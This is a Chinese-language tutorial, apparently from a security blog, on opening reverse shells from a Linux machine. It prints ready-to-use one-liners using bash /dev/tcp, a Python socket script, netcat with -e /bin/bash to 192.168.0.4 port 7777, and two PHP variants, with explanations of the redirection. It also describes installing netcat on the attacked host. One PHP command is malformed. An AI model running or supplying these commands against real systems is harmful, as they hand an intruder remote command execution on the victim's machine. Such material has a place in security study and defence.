## Linux反弹shell

(1) bash反弹shell

bash -i >& /dev/tcp/ip/port 0>&1

bash -i代表在本地打开一个bash，然后就是/dev/tcp/ip/port，
/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，>&后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出，这个时候我们在本机CentOS输入命令，输出以及错误输出的内容就会被传递显示到远程。

为了更形象的理解，下面给出了整个过程的数据流向，首先是本地的输入输出流向

![1634705244_616f9f5c23105e7204693.png!small](https://image.3001.net/images/20211020/1634705244_616f9f5c23105e7204693.png!small)

执行bash -i >& /dev/tcp/ip/port后

![1634705222_616f9f46c5e1157e59f0c.png!small](https://image.3001.net/images/20211020/1634705222_616f9f46c5e1157e59f0c.png!small)

执行bash -i >& /dev/tcp/ip/port 0>&1或者bash -i >& /dev/tcp/ip/port 0>&2后：

![1634705268_616f9f74038ae02937894.png!small](https://image.3001.net/images/20211020/1634705268_616f9f74038ae02937894.png!small)

(2) python 代码反弹shell

python -c "import
os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"

原理：首先使用socket与远程建立起连接，接下来使用到了os库的dup2方法将标准输入、标准输出、标准错误输出重定向到远程，dup2这个方法有两个参数，分别为文件描述符fd1和fd2，当fd2参数存在时，就关闭fd2，然后将fd1代表的那个文件强行复制给fd2，在这里可以把fd1和fd2看作是C语言里的指针，将fd1赋值给fd2，就相当于将fd2指向于s.fileno()，fileno()返回的是一个文件描述符，在这里也就是建立socket连接返回的文件描述符，经过测试可以看到值为3。

（3）使用nc反弹shell，需要的条件是被反弹shell的机器安装了nc（这个条件就有点鸡肋了，如果前两种方式都不行的话，可以在被攻击机上安装nc）

1、下载安装 wget
https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download
tar -zxvf netcat-0.7.1.tar.gz -C /usr/local cd /usr/local mv netcat-0.7.1
netcat cd /usr/local/netcat ./configure make && make install 2、配置 vim
/etc/profile 添加以下内容： # set netcat path export NETCAT_HOME=/usr/local/netcat
export PATH=$PATH:$NETCAT_HOME/bin 保存，退出，并使配置生效： source /etc/profile 3、测试 nc
-help成功

然后在目标机上使用nc反向连接本地机

nc -e /bin/bash 192.168.0.4 7777

这里的-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(/bin/bash)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令。

（4）使用php反弹shell

php- 'exec("/bin/bash -i >& /dev/tcp/192.168.0.4/7777")'

php -r '$sock=fsockopen("ip",port);exec("/bin/bash -i <&3 >&3 2>&3");'

